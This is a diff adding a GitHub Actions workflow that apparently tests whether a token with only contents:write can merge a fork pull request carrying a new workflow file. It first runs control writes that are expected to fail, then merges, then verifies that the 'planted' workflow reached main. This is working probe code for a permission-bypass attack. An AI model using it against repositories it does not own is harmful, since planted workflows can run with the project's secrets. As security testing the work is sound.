@@ -1,0 +1,79 @@
+name: l2-runner
+# Lane L2 runner: GITHUB_TOKEN with ONLY contents:write merges a fork PR
+# carrying a novel workflow file, then verifies the file landed on main.
+on:
+  workflow_dispatch:
+    inputs:
+      pr:
+        description: "PR number to merge (mode=pr)"
+        required: false
+      mode:
+        description: "pr = PUT /pulls/{n}/merge | merges = POST /merges"
+        required: false
+        default: "pr"
+      head:
+        description: "head for mode=merges (user:branch or sha)"
+        required: false
+      expected_path:
+        description: "planted workflow path expected on main"
+        required: false
+      expected_sha:
+        description: "planted blob sha expected on main"
+        required: false
+
+jobs:
+  merge-external:
+    permissions:
+      contents: write        # the floor under test; pull-requests NOT granted
+    runs-on: ubuntu-latest
+    env:
+      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      MODE: ${{ github.event.inputs.mode }}
+      PRN: ${{ github.event.inputs.pr }}
+      HEAD: ${{ github.event.inputs.head }}
+      EXP_PATH: ${{ github.event.inputs.expected_path }}
+      EXP_SHA: ${{ github.event.inputs.expected_sha }}
+    steps:
+      - name: laneL2 controls and merge
+        run: |
+          set -u
+          B="$GITHUB_API_URL/repos/$GITHUB_REPOSITORY"
+          A="Authorization: Bearer $GH_TOKEN"
+          AC="Accept: application/vnd.github+json"
+          req() {
+            local m="$1" p="$2" d="${3:-}"
+            curl -sS -X "$m" -H "$A" -H "$AC" ${d:+-d "$d"} -D /tmp/hdrs.txt -o /tmp/body.json -w '<http>%{http_code}' "$B$p"
+          }
+          echo "== LANE L2 | repo=$GITHUB_REPOSITORY run=$GITHUB_RUN_ID mode=$MODE pr=$PRN =="
+          echo "== actor=$GITHUB_ACTOR event=$GITHUB_EVENT_NAME =="
+
+          echo "--- A1 control: PUT /contents new workflow file"
+          req PUT "/contents/.github/workflows/vx-ctl-$GITHUB_RUN_ID.yml" '{"message":"ctl","content":"bmFtZTogeAo="}'
+          echo; echo "BODY: $(head -c 300 /tmp/body.json)"; grep -i 'x-accepted-github-permissions' /tmp/hdrs.txt || true
+
+          echo "--- A2 control: POST /git/trees with new workflow content"
+          MSHA=$(curl -sS -H "$A" -H "$AC" "$B/git/ref/heads/main" | python3 -c 'import sys,json;print(json.load(sys.stdin)["object"]["sha"])')
+          MT=$(curl -sS -H "$A" -H "$AC" "$B/git/commits/$MSHA" | python3 -c 'import sys,json;print(json.load(sys.stdin)["tree"]["sha"])')
+          req POST "/git/trees" "{\"base_tree\":\"$MT\",\"tree\":[{\"path\":\".github/workflows/vx-ctl2-$GITHUB_RUN_ID.yml\",\"mode\":\"100644\",\"type\":\"blob\",\"content\":\"name: x\\n\"}]}"
+          echo; echo "BODY: $(head -c 300 /tmp/body.json)"; grep -i 'x-accepted-github-permissions' /tmp/hdrs.txt || true
+
+          echo "--- B merge phase (mode=$MODE)"
+          if [ "$MODE" = "merges" ]; then
+            echo "POST /merges base=main head=$HEAD"
+            req POST "/merges" "{\"base\":\"main\",\"head\":\"$HEAD\"}"
+            echo; echo "BODY: $(head -c 500 /tmp/body.json)"
+          else
+            echo "PUT /pulls/$PRN/merge (squash)"
+            req PUT "/pulls/$PRN/merge" '{"merge_method":"squash"}'
+            echo; echo "BODY: $(head -c 500 /tmp/body.json)"
+          fi
+
+          echo "--- C verify planted file on main"
+          if [ -n "$EXP_PATH" ]; then
+            req GET "/contents/$EXP_PATH?ref=main"
+            echo
+            python3 -c "import json;d=json.load(open('/tmp/body.json'));print('main blob sha:',d.get('sha'),'expected:',\"$EXP_SHA\",'MATCH' if d.get('sha')==\"$EXP_SHA\" else 'MISMATCH')" 2>/dev/null || head -c 300 /tmp/body.json
+            echo "--- workflows listing"
+            curl -sS -H "$A" -H "$AC" "$B/actions/workflows" | python3 -c 'import sys,json; [print(w["id"],w["state"],w["path"]) for w in json.load(sys.stdin)["workflows"]]'
+          fi
+          echo "== LANE L2 DONE =="
